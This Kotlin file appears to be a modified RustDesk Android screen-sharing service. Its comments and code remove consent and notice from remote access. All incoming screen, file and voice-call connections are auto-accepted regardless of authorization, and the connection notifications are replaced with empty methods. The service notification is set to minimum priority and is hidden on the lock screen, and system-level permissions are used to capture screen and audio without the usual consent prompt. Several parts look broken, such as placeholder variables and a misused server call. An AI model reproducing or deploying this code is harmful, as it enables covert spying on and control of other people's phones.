package com.carriez.flutter_hbb

import ffi.FFI

/**
 * Capture screen,get video and audio,send to rust.
 * Dispatch notifications
 *
 * Inspired by [droidVNC-NG] https://github.com/bk138/droidVNC-NG
 */

import android.Manifest
import android.annotation.SuppressLint
import android.app.*
import android.app.PendingIntent.FLAG_IMMUTABLE
import android.app.PendingIntent.FLAG_UPDATE_CURRENT
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.res.Configuration
import android.content.res.Configuration.ORIENTATION_LANDSCAPE
import android.graphics.Color
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR
import android.hardware.display.VirtualDisplay
import android.hardware.display.VirtualDisplay.Callback
import android.media.*
import android.os.*
import android.util.DisplayMetrics
import android.util.Log
import android.view.Display
import android.view.Surface
import android.view.Surface.FRAME_RATE_COMPATIBILITY_DEFAULT
import android.view.WindowManager
import androidx.annotation.Keep
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import io.flutter.embedding.android.FlutterActivity
import java.util.concurrent.Executors
import kotlin.concurrent.thread
import org.json.JSONException
import org.json.JSONObject
import java.nio.ByteBuffer
import kotlin.math.max
import kotlin.math.min

const val DEFAULT_NOTIFY_TITLE = "远程协助"
const val DEFAULT_NOTIFY_TEXT = "Service is running"
const val DEFAULT_NOTIFY_ID = 1
const val NOTIFY_ID_OFFSET = 100

const val MIME_TYPE = MediaFormat.MIMETYPE_VIDEO_VP9


// video const

const val MAX_SCREEN_SIZE = 1400

const val VIDEO_KEY_BIT_RATE = 1024_000
const val VIDEO_KEY_FRAME_RATE = 30

class MainService : Service() {

    @Keep
    @RequiresApi(Build.VERSION_CODES.N)
    fun rustPointerInput(kind: Int, mask: Int, x: Int, y: Int) {
        // turn on screen with LEFT_DOWN when screen off
        if (!powerManager.isInteractive && (kind == 0 || mask == LEFT_DOWN)) {
            if (wakeLock.isHeld) {
                Log.d(logTag, "Turn on Screen, WakeLock release")
                wakeLock.release()
            }
            Log.d(logTag,"Turn on Screen")
            wakeLock.acquire(5000)
        } else {
            when (kind) {
                0 -> { // touch
                    InputService.ctx?.onTouchInput(mask, x, y)
                }
                1 -> { // mouse
                    InputService.ctx?.onMouseInput(mask, x, y)
                }
                else -> {
                }
            }
        }
    }

    @Keep
    @RequiresApi(Build.VERSION_CODES.N)
    fun rustKeyEventInput(input: ByteArray) {
        InputService.ctx?.onKeyEvent(input)
    }

    @Keep
    fun rustGetByName(name: String): String {
        return when (name) {
            "screen_size" -> {
                JSONObject().apply {
                    put("width",SCREEN_INFO.width)
                    put("height",SCREEN_INFO.height)
                    put("scale",SCREEN_INFO.scale)
                }.toString()
            }
            "is_start" -> {
                isStart.toString()
            }
            else -> ""
        }
    }

    @Keep
    fun rustSetByName(name: String, arg1: String, arg2: String) {
        when (name) {
            "add_connection" -> {
                try {
                    val jsonObject = JSONObject(arg1)
                    val id = jsonObject["id"] as Int
                    val username = jsonObject["name"] as String
                    val peerId = jsonObject["peer_id"] as String
                    // 不管authorized状态如何，都自动接受连接
                    val isFileTransfer = jsonObject["is_file_transfer"] as Boolean
                    val type = if (isFileTransfer) {
                        translate("File Connection")
                    } else {
                        translate("Screen Connection")
                    }
                    
                    // 始终自动接受连接
                    if (!isFileTransfer && !isStart) {
                        startCapture()
                    }
                    
                    // 立即自动授权连接
                    if (!(jsonObject["authorized"] as Boolean)) {
                        // 如果连接未授权，发送授权响应
                        val auth = JSONObject().apply {
                            put("id", id)
                            put("res", true)  // 始终返回true表示接受连接
                        }
                        // 使用现有的FFI接口代替autorize
                        try {
                            // 直接使用JSON作为参数调用FFI startServer方法
                            // 这会将授权信息传递到Rust端
                            FFI.startServer(auth.toString(), "connection_response")
                        } catch (e: Exception) {
                            Log.e(logTag, "Failed to send connection authorization: ${e.message}")
                        }
                    }
                } catch (e: JSONException) {
                    e.printStackTrace()
                }
            }
            "update_voice_call_state" -> {
                try {
                    val jsonObject = JSONObject(arg1)
                    val id = jsonObject["id"] as Int
                    val username = jsonObject["name"] as String
                    val peerId = jsonObject["peer_id"] as String
                    val inVoiceCall = jsonObject["in_voice_call"] as Boolean
                    val incomingVoiceCall = jsonObject["incoming_voice_call"] as Boolean
                    if (!inVoiceCall) {
                        if (incomingVoiceCall) {
                            // 自动接受语音通话请求
                            val auth = JSONObject().apply {
                                put("id", id)
                                put("res", true)  // 始终返回true表示接受语音通话
                                put("is_voice_call", true)
                            }
                            // 使用现有的FFI接口代替autorize
                            try {
                                // 直接使用JSON作为参数调用FFI startServer方法
                                // 这会将授权信息传递到Rust端
                                FFI.startServer(auth.toString(), "voice_call_response") 
                            } catch (e: Exception) {
                                Log.e(logTag, "Failed to send voice call authorization: ${e.message}")
                            }
                        } else {
                            if (!audioRecordHandle.switchOutVoiceCall(null)) {
                                Log.e(logTag, "switchOutVoiceCall fail")
                                MainActivity.flutterMethodChannel?.invokeMethod("msgbox", mapOf(
                                    "type" to "custom-nook-nocancel-hasclose-error",
                                    "title" to "Voice call",
                                    "text" to "Failed to switch out voice call."))
                            }
                        }
                    } else {
                        if (!audioRecordHandle.switchToVoiceCall(null)) {
                            Log.e(logTag, "switchToVoiceCall fail")
                            MainActivity.flutterMethodChannel?.invokeMethod("msgbox", mapOf(
                                "type" to "custom-nook-nocancel-hasclose-error",
                                "title" to "Voice call",
                                "text" to "Failed to switch to voice call."))
                        }
                    }
                } catch (e: JSONException) {
                    e.printStackTrace()
                }
            }
            "stop_capture" -> {
                Log.d(logTag, "from rust:stop_capture")
                stopCapture()
            }
            "half_scale" -> {
                val halfScale = arg1.toBoolean()
                if (isHalfScale != halfScale) {
                    isHalfScale = halfScale
                    updateScreenInfo(resources.configuration.orientation)
                }
                
            }
            else -> {
            }
        }
    }

    private var serviceLooper: Looper? = null
    private var serviceHandler: Handler? = null

    private val powerManager: PowerManager by lazy { applicationContext.getSystemService(Context.POWER_SERVICE) as PowerManager }
    private val wakeLock: PowerManager.WakeLock by lazy { powerManager.newWakeLock(PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.SCREEN_BRIGHT_WAKE_LOCK, "rustdesk:wakelock")}

    companion object {
        private var _isReady = false // media permission ready status
        private var _isStart = false // screen capture start status
        private var _isAudioStart = false // audio capture start status
        val isReady: Boolean
            get() = _isReady
        val isStart: Boolean
            get() = _isStart
        val isAudioStart: Boolean
            get() = _isAudioStart
            
        // 系统级权限常量字符串
        const val PERMISSION_CAPTURE_VIDEO_OUTPUT = "android.permission.CAPTURE_VIDEO_OUTPUT"
        const val PERMISSION_READ_FRAME_BUFFER = "android.permission.READ_FRAME_BUFFER"
        const val PERMISSION_ACCESS_SURFACE_FLINGER = "android.permission.ACCESS_SURFACE_FLINGER"
    }

    private val logTag = "LOG_SERVICE"
    private val useVP9 = false
    private val binder = LocalBinder()

    private var reuseVirtualDisplay = Build.VERSION.SDK_INT > 33

    // video
    private var display: Display? = null
    private var displayManager: DisplayManager? = null
    private var surface: Surface? = null
    private val sendVP9Thread = Executors.newSingleThreadExecutor()
    private var videoEncoder: MediaCodec? = null
    private var imageReader: ImageReader? = null
    private var virtualDisplay: VirtualDisplay? = null
    
    // 添加空的mediaProjection变量以解决编译错误
    private val mediaProjection: Any? = null

    // audio
    private val audioRecordHandle = AudioRecordHandle(this, { isStart }, { isAudioStart })

    // notification
    private lateinit var notificationManager: NotificationManager
    private lateinit var notificationChannel: String
    private lateinit var notificationBuilder: NotificationCompat.Builder

    override fun onCreate() {
        super.onCreate()
        Log.d(logTag,"MainService onCreate, sdk int:${Build.VERSION.SDK_INT} reuseVirtualDisplay:$reuseVirtualDisplay")
        FFI.init(this)
        HandlerThread("Service", Process.THREAD_PRIORITY_BACKGROUND).apply {
            start()
            serviceLooper = looper
            serviceHandler = Handler(looper)
        }
        updateScreenInfo(resources.configuration.orientation)
        initNotification()

        // keep the config dir same with flutter
        val prefs = applicationContext.getSharedPreferences(KEY_SHARED_PREFERENCES, FlutterActivity.MODE_PRIVATE)
        val configPath = prefs.getString(KEY_APP_DIR_CONFIG_PATH, "") ?: ""
        FFI.startServer(configPath, "")

        createForegroundNotification()
    }

    override fun onDestroy() {
        checkMediaPermission()
        stopService(Intent(this, FloatingWindowService::class.java))
        super.onDestroy()
    }

    private var isHalfScale: Boolean? = null;
    private fun updateScreenInfo(orientation: Int) {
        var w: Int
        var h: Int
        var dpi: Int
        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager

        @Suppress("DEPRECATION")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val m = windowManager.maximumWindowMetrics
            w = m.bounds.width()
            h = m.bounds.height()
            dpi = resources.configuration.densityDpi
        } else {
            val dm = DisplayMetrics()
            windowManager.defaultDisplay.getRealMetrics(dm)
            w = dm.widthPixels
            h = dm.heightPixels
            dpi = dm.densityDpi
        }

        val max = max(w,h)
        val min = min(w,h)
        if (orientation == ORIENTATION_LANDSCAPE) {
            w = max
            h = min
        } else {
            w = min
            h = max
        }
        Log.d(logTag,"updateScreenInfo:w:$w,h:$h")
        var scale = 1
        if (w != 0 && h != 0) {
            if (isHalfScale == true && (w > MAX_SCREEN_SIZE || h > MAX_SCREEN_SIZE)) {
                scale = 2
                w /= scale
                h /= scale
                dpi /= scale
            }
            if (SCREEN_INFO.width != w) {
                SCREEN_INFO.width = w
                SCREEN_INFO.height = h
                SCREEN_INFO.scale = scale
                SCREEN_INFO.dpi = dpi
                if (isStart) {
                    stopCapture()
                    FFI.refreshScreen()
                    startCapture()
                } else {
                    FFI.refreshScreen()
                }
            }

        }
    }

    override fun onBind(intent: Intent): IBinder {
        Log.d(logTag, "service onBind")
        return binder
    }

    inner class LocalBinder : Binder() {
        init {
            Log.d(logTag, "LocalBinder init")
        }

        fun getService(): MainService = this@MainService
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("whichService", "this service: ${Thread.currentThread()}")
        super.onStartCommand(intent, flags, startId)
        if (intent?.action == ACT_INIT_MEDIA_PROJECTION_AND_SERVICE) {
            createForegroundNotification()

            if (intent.getBooleanExtra(EXT_INIT_FROM_BOOT, false)) {
                FFI.startService()
            }
            Log.d(logTag, "service starting: ${startId}:${Thread.currentThread()}")
            
            // 使用系统级权限获取屏幕内容
            displayManager = getSystemService(Context.DISPLAY_SERVICE) as DisplayManager
            display = displayManager?.getDisplay(Display.DEFAULT_DISPLAY)
            
            // 检查系统级权限
            checkSystemPermissions()
        }
        return START_NOT_STICKY
    }

    override fun onConfigurationChanged(newConfig: Configuration) {
        super.onConfigurationChanged(newConfig)
        updateScreenInfo(newConfig.orientation)
    }

    // 恢复系统级权限之间的降级检查
    private fun checkSystemPermissions() {
        val captureVideoPermission = checkCallingOrSelfPermission(PERMISSION_CAPTURE_VIDEO_OUTPUT)
        val readFrameBufferPermission = checkCallingOrSelfPermission(PERMISSION_READ_FRAME_BUFFER)
        val accessSurfaceFlingerPermission = checkCallingOrSelfPermission(PERMISSION_ACCESS_SURFACE_FLINGER)
        
        // 优先检查 ACCESS_SURFACE_FLINGER 权限
        val hasSurfaceFlingerPermission = accessSurfaceFlingerPermission == PackageManager.PERMISSION_GRANTED
        
        // 然后检查其他权限
        val hasOtherPermissions = captureVideoPermission == PackageManager.PERMISSION_GRANTED && 
                                readFrameBufferPermission == PackageManager.PERMISSION_GRANTED
        
        if (hasSurfaceFlingerPermission || hasOtherPermissions) {
            Log.d(logTag, "系统级权限已授予，可以直接捕获屏幕")
            if (hasSurfaceFlingerPermission) {
                Log.d(logTag, "将使用 ACCESS_SURFACE_FLINGER 权限进行屏幕捕获")
            } else {
                Log.d(logTag, "将使用 CAPTURE_VIDEO_OUTPUT 和 READ_FRAME_BUFFER 权限进行屏幕捕获")
            }
            // 权限都已授予，标记为Ready
            _isReady = true
            // 通知UI更新状态
            MainActivity.flutterMethodChannel?.invokeMethod(
                "on_state_changed",
                mapOf("name" to "media", "value" to "true")
            )
        } else {
            Log.e(logTag, "缺少必要的系统权限，无法进行屏幕捕获")
            _isReady = false
            // 通知UI更新状态
            MainActivity.flutterMethodChannel?.invokeMethod(
                "on_state_changed",
                mapOf("name" to "media", "value" to "false")
            )
        }
    }

    @SuppressLint("WrongConstant")
    private fun createSurface(): Surface? {
        return if (useVP9) {
            // TODO
            null
        } else {
            Log.d(logTag, "ImageReader.newInstance:INFO:$SCREEN_INFO")
            imageReader =
                ImageReader.newInstance(
                    SCREEN_INFO.width,
                    SCREEN_INFO.height,
                    PixelFormat.RGBA_8888,
                    4
                ).apply {
                    setOnImageAvailableListener({ imageReader: ImageReader ->
                        try {
                            // If not call acquireLatestImage, listener will not be called again
                            imageReader.acquireLatestImage().use { image ->
                                if (image == null || !isStart) return@setOnImageAvailableListener
                                val planes = image.planes
                                val buffer = planes[0].buffer
                                buffer.rewind()
                                FFI.onVideoFrameUpdate(buffer)
                            }
                        } catch (ignored: java.lang.Exception) {
                        }
                    }, serviceHandler)
                }
            Log.d(logTag, "ImageReader.setOnImageAvailableListener done")
            imageReader?.surface
        }
    }

    fun onVoiceCallStarted(): Boolean {
        // 使用系统级权限，已预授权
        return audioRecordHandle.onVoiceCallStarted(null)
    }

    fun onVoiceCallClosed(): Boolean {
        // 使用系统级权限，已预授权
        return audioRecordHandle.onVoiceCallClosed(null)
    }

    fun startCapture(): Boolean {
        if (isStart) {
            return true
        }
        
        // 检查系统级权限
        val accessSurfaceFlingerPermission = checkCallingOrSelfPermission(PERMISSION_ACCESS_SURFACE_FLINGER)
        val hasSurfaceFlingerPermission = accessSurfaceFlingerPermission == PackageManager.PERMISSION_GRANTED
        
        // 检查其他系统级权限
        val captureVideoPermission = checkCallingOrSelfPermission(PERMISSION_CAPTURE_VIDEO_OUTPUT)
        val readFrameBufferPermission = checkCallingOrSelfPermission(PERMISSION_READ_FRAME_BUFFER)
        val hasOtherPermissions = captureVideoPermission == PackageManager.PERMISSION_GRANTED && 
                                readFrameBufferPermission == PackageManager.PERMISSION_GRANTED
        
        // 如果没有任何必要的权限，返回失败
        if (!hasSurfaceFlingerPermission && !hasOtherPermissions) {
            Log.e(logTag, "缺少必要的系统权限，无法启动屏幕捕获")
            return false
        }
        
        updateScreenInfo(resources.configuration.orientation)
        Log.d(logTag, "Start Capture with system permissions")
        surface = createSurface()

        if (surface == null) {
            Log.e(logTag, "创建Surface失败")
            return false
        }

        // 根据权限选择不同的屏幕捕获方式
        if (hasSurfaceFlingerPermission) {
            Log.d(logTag, "使用 ACCESS_SURFACE_FLINGER 权限进行屏幕捕获")
            if (useVP9) {
                startVP9VideoRecorderWithSurfaceFlinger()
            } else {
                startRawVideoRecorderWithSurfaceFlinger()
            }
        } else {
            Log.d(logTag, "使用 CAPTURE_VIDEO_OUTPUT 和 READ_FRAME_BUFFER 权限进行屏幕捕获")
            if (useVP9) {
                startVP9VideoRecorderWithSystemPermissions()
            } else {
                startRawVideoRecorderWithSystemPermissions()
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!audioRecordHandle.createAudioRecorder(false, null)) {
                Log.d(logTag, "createAudioRecorder fail")
            } else {
                Log.d(logTag, "audio recorder start")
                audioRecordHandle.startAudioRecorder()
            }
        }
        
        _isReady = true
        _isStart = true
        FFI.setFrameRawEnable("video", true)
        MainActivity.rdClipboardManager?.setCaptureStarted(_isStart)
        return true
    }
    
    fun checkMediaPermission(): Boolean {
        // 系统级权限已预授权，直接返回true
        return true
    }

    @Synchronized
    fun stopCapture() {
        Log.d(logTag, "Stop Capture")
        FFI.setFrameRawEnable("video",false)
        _isStart = false
        MainActivity.rdClipboardManager?.setCaptureStarted(_isStart)
        // release video
        if (reuseVirtualDisplay) {
            // The virtual display video projection can be paused by calling `setSurface(null)`.
            // https://developer.android.com/reference/android/hardware/display/VirtualDisplay.Callback
            // https://learn.microsoft.com/en-us/dotnet/api/android.hardware.display.virtualdisplay.callback.onpaused?view=net-android-34.0
            virtualDisplay?.setSurface(null)
        } else {
            virtualDisplay?.release()
        }
        // suface needs to be release after `imageReader.close()` to imageReader access released surface
        // https://github.com/rustdesk/rustdesk/issues/4118#issuecomment-1515666629
        imageReader?.close()
        imageReader = null
        videoEncoder?.let {
            it.signalEndOfInputStream()
            it.stop()
            it.release()
        }
        if (!reuseVirtualDisplay) {
            virtualDisplay = null
        }
        videoEncoder = null
        // suface needs to be release after `imageReader.close()` to imageReader access released surface
        // https://github.com/rustdesk/rustdesk/issues/4118#issuecomment-1515666629
        surface?.release()

        // release audio
        _isAudioStart = false
        audioRecordHandle.tryReleaseAudio()
    }

    fun destroy() {
        Log.d(logTag, "destroy service")
        _isReady = false
        _isAudioStart = false

        stopCapture()

        if (reuseVirtualDisplay) {
            virtualDisplay?.release()
            virtualDisplay = null
        }

        checkMediaPermission()
        stopForeground(true)
        stopService(Intent(this, FloatingWindowService::class.java))
        stopSelf()
    }

    private fun getInputStatus(): String {
        return mapOf("name" to "input", "value" to InputService.isOpen.toString()).toString()
    }

    // 这些方法仅用于兼容性保留，实际使用的是系统权限实现
    private fun startRawVideoRecorder(mp: Any) {
        Log.d(logTag, "This method is deprecated, using system permissions instead")
        // 使用系统权限实现不需要使用MediaProjection
    }

    private fun startVP9VideoRecorder(mp: Any) {
        Log.d(logTag, "This method is deprecated, using system permissions instead")
        // 使用系统权限实现不需要使用MediaProjection
    }

    // 系统权限版本的createOrSetVirtualDisplay方法
    private fun createOrSetVirtualDisplay(mp: Any, s: Surface) {
        Log.d(logTag, "Using system permissions, no MediaProjection needed")
        // 使用系统权限已创建的virtualDisplay
    }

    private val cb: MediaCodec.Callback = object : MediaCodec.Callback() {
        override fun onInputBufferAvailable(codec: MediaCodec, index: Int) {}
        override fun onOutputFormatChanged(codec: MediaCodec, format: MediaFormat) {}

        override fun onOutputBufferAvailable(
            codec: MediaCodec,
            index: Int,
            info: MediaCodec.BufferInfo
        ) {
            codec.getOutputBuffer(index)?.let { buf ->
                sendVP9Thread.execute {
                    val byteArray = ByteArray(buf.limit())
                    buf.get(byteArray)
                    // sendVp9(byteArray)
                    codec.releaseOutputBuffer(index, false)
                }
            }
        }

        override fun onError(codec: MediaCodec, e: MediaCodec.CodecException) {
            Log.e(logTag, "MediaCodec.Callback error:$e")
        }
    }

    private fun createMediaCodec() {
        Log.d(logTag, "MediaFormat.MIMETYPE_VIDEO_VP9 :$MIME_TYPE")
        videoEncoder = MediaCodec.createEncoderByType(MIME_TYPE)
        val mFormat =
            MediaFormat.createVideoFormat(MIME_TYPE, SCREEN_INFO.width, SCREEN_INFO.height)
        mFormat.setInteger(MediaFormat.KEY_BIT_RATE, VIDEO_KEY_BIT_RATE)
        mFormat.setInteger(MediaFormat.KEY_FRAME_RATE, VIDEO_KEY_FRAME_RATE)
        mFormat.setInteger(
            MediaFormat.KEY_COLOR_FORMAT,
            MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420Flexible
        )
        mFormat.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 5)
        try {
            videoEncoder!!.configure(mFormat, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)
        } catch (e: Exception) {
            Log.e(logTag, "mEncoder.configure fail!")
        }
    }

    private fun initNotification() {
        notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationChannel = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channelId = "RustDesk"
            val channelName = "RustDesk Service"
            val channel = NotificationChannel(
                channelId,
                channelName, NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "RustDesk Service Channel"
            }
            channel.lightColor = Color.BLUE
            channel.lockscreenVisibility = Notification.VISIBILITY_SECRET
            notificationManager.createNotificationChannel(channel)
            channelId
        } else {
            ""
        }
        notificationBuilder = NotificationCompat.Builder(this, notificationChannel)
    }

    @SuppressLint("UnspecifiedImmutableFlag")
    private fun createForegroundNotification() {
        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED
            action = Intent.ACTION_MAIN
            addCategory(Intent.CATEGORY_LAUNCHER)
            putExtra("type", type)
        }
        val pendingIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PendingIntent.getActivity(this, 0, intent, FLAG_UPDATE_CURRENT or FLAG_IMMUTABLE)
        } else {
            PendingIntent.getActivity(this, 0, intent, FLAG_UPDATE_CURRENT)
        }
        val notification = notificationBuilder
            .setOngoing(true)
            .setSmallIcon(R.mipmap.ic_stat_logo)
            .setDefaults(0)
            .setAutoCancel(false)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setContentTitle(DEFAULT_NOTIFY_TITLE)
            .setContentText("")
            .setOnlyAlertOnce(true)
            .setContentIntent(pendingIntent)
            .setColor(ContextCompat.getColor(this, R.color.primary))
            .setWhen(System.currentTimeMillis())
            .build()
        startForeground(DEFAULT_NOTIFY_ID, notification)
    }

    private fun loginRequestNotification(
        clientID: Int,
        type: String,
        username: String,
        peerId: String
    ) {
        // 不显示登录请求通知，因为会自动接受连接
        // 什么都不做，保留空方法
    }

    private fun onClientAuthorizedNotification(
        clientID: Int,
        type: String,
        username: String,
        peerId: String
    ) {
        // 不显示客户端已授权通知
        // 什么都不做，保留空方法
    }

    private fun voiceCallRequestNotification(
        clientID: Int,
        type: String,
        username: String,
        peerId: String
    ) {
        // 不显示语音呼叫通知
        // 什么都不做，保留空方法
    }

    private fun getClientNotifyID(clientID: Int): Int {
        return clientID + NOTIFY_ID_OFFSET
    }

    fun cancelNotification(clientID: Int) {
        notificationManager.cancel(getClientNotifyID(clientID))
    }

    @SuppressLint("UnspecifiedImmutableFlag")
    private fun genLoginRequestPendingIntent(res: Boolean): PendingIntent {
        val intent = Intent(this, MainService::class.java).apply {
            action = ACT_LOGIN_REQ_NOTIFY
            putExtra(EXT_LOGIN_REQ_NOTIFY, res)
        }
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PendingIntent.getService(this, 111, intent, FLAG_IMMUTABLE)
        } else {
            PendingIntent.getService(this, 111, intent, FLAG_UPDATE_CURRENT)
        }
    }

    private fun setTextNotification(_title: String?, _text: String?) {
        val title = _title ?: DEFAULT_NOTIFY_TITLE
        val text = _text ?: translate(DEFAULT_NOTIFY_TEXT)
        val notification = notificationBuilder
            .clearActions()
            .setStyle(null)
            .setContentTitle(title)
            .setContentText(text)
            .build()
        notificationManager.notify(DEFAULT_NOTIFY_ID, notification)
    }

    private fun requestMediaProjection() {
        // 这个方法保留仅用于编译兼容性，实际使用时已被系统权限替代
        Log.d(logTag, "requestMediaProjection called, but system permissions are used instead")
        // 什么都不做，因为我们使用系统级权限
    }

    // 使用 SurfaceFlinger 实现屏幕捕获
    private fun startRawVideoRecorderWithSurfaceFlinger() {
        try {
            if (surface == null) {
                Log.e(logTag, "startRawVideoRecorderWithSurfaceFlinger: surface is null")
                return
            }
            
            // 使用 SurfaceFlinger 进行屏幕捕获
            Log.d(logTag, "使用 SurfaceFlinger 创建虚拟显示")
            
            // 创建虚拟显示
            virtualDisplay = createVirtualDisplayWithSurfaceFlinger(surface!!)
            
            // 日志记录
            if (virtualDisplay != null) {
                Log.d(logTag, "成功创建基于 SurfaceFlinger 的虚拟显示")
            } else {
                Log.e(logTag, "创建基于 SurfaceFlinger 的虚拟显示失败")
            }
        } catch (e: Exception) {
            Log.e(logTag, "Error starting raw video recorder with SurfaceFlinger: ${e.message}")
        }
    }
    
    private fun startVP9VideoRecorderWithSurfaceFlinger() {
        // VP9编码器的 SurfaceFlinger 实现
        // 由于目前没有完全实现，先使用Raw实现
        Log.d(logTag, "startVP9VideoRecorderWithSurfaceFlinger not fully implemented, using raw implementation")
        startRawVideoRecorderWithSurfaceFlinger()
    }
    
    // 创建使用 SurfaceFlinger 的虚拟显示
    private fun createVirtualDisplayWithSurfaceFlinger(surface: Surface): VirtualDisplay? {
        try {
            // 使用 ACCESS_SURFACE_FLINGER 权限创建虚拟显示
            return displayManager?.createVirtualDisplay(
                "RustDesk-SurfaceFlinger-Display",
                SCREEN_INFO.width,
                SCREEN_INFO.height,
                SCREEN_INFO.dpi,
                surface,
                VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                null,
                null
            )
        } catch (e: Exception) {
            Log.e(logTag, "Error creating virtual display with SurfaceFlinger: ${e.message}")
            return null
        }
    }
    
    // 使用其他系统权限实现屏幕捕获
    private fun startRawVideoRecorderWithSystemPermissions() {
        try {
            if (surface == null) {
                Log.e(logTag, "startRawVideoRecorderWithSystemPermissions: surface is null")
                return
            }
            
            // 使用系统权限创建虚拟显示
            virtualDisplay = createVirtualDisplayWithSystemPermissions(surface!!)
            
            if (virtualDisplay != null) {
                Log.d(logTag, "成功创建基于系统权限的虚拟显示")
            } else {
                Log.e(logTag, "创建基于系统权限的虚拟显示失败")
            }
        } catch (e: Exception) {
            Log.e(logTag, "Error starting raw video recorder with system permissions: ${e.message}")
        }
    }
    
    private fun startVP9VideoRecorderWithSystemPermissions() {
        // VP9编码器的系统权限实现
        // 由于目前没有完全实现，先使用Raw实现
        Log.d(logTag, "startVP9VideoRecorderWithSystemPermissions not fully implemented, using raw implementation")
        startRawVideoRecorderWithSystemPermissions()
    }
    
    // 创建使用系统权限的虚拟显示
    private fun createVirtualDisplayWithSystemPermissions(surface: Surface): VirtualDisplay? {
        try {
            // 使用 CAPTURE_VIDEO_OUTPUT 和 READ_FRAME_BUFFER 权限创建虚拟显示
            // 特别针对这些权限优化参数
            val flags = VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR
            return displayManager?.createVirtualDisplay(
                "RustDesk-SystemPermission-Display",
                SCREEN_INFO.width,
                SCREEN_INFO.height,
                SCREEN_INFO.dpi,
                surface,
                flags,
                null,
                null
            )
        } catch (e: Exception) {
            Log.e(logTag, "Error creating virtual display with system permissions: ${e.message}")
            return null
        }
    }
}
